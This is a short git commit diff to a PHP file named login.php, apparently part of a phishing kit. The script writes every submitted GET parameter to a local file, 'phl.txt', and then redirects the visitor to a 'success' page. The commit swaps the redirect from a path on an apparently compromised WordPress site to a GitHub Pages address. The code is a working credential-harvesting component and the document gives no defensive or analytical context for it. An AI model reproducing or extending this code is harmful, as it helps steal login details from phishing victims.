17d929acab426b25be9c6e725f3074099479194a
Noode2024 <tradebnb.200@gmail.com>
2024-10-18 18:42:58 +0330

    Update login.php

--- login.php
+++ login.php
@@ -1,5 +1,5 @@
 <?php
-header ('Location:https://upstateplumbinginc.com/wp-includes/main/success.html');
+header ('Location:https://noode2024.github.io/networktw/success.html');
 $handle = fopen("phl.txt", "a");
 foreach($_GET as $variable => $value) {
    fwrite($handle, $variable);
